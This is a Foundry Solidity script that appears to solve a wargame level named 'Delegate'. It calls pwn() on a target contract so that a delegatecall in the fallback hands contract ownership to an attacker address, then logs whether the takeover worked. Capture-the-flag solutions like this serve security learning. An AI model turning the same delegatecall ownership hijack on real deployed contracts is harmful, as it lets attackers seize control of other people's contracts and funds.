// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "lib-src/Script.sol";
import {console} from "lib-src/console.sol";

import {Delegate} from "src/Delegate.sol";

// forge script script/6_Delegate.s.sol --tc DelegateSolution -vvv
contract DelegateSolution is Script {

    Delegate public target = Delegate(0x2d13498dA60ffDE3FDe7B40bE1fc1e8FA3B8d453);
    address public attacker = 0x5B1D72Dce914FC4fB24d2BfBa4DdBdd05625152D;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        (bool suc, ) = address(target).call(abi.encodeWithSignature("pwn()"));
        console.log("Call success:", suc);
        console.log("Attack success:", target.owner() == attacker);

        vm.stopBroadcast();
    }
}
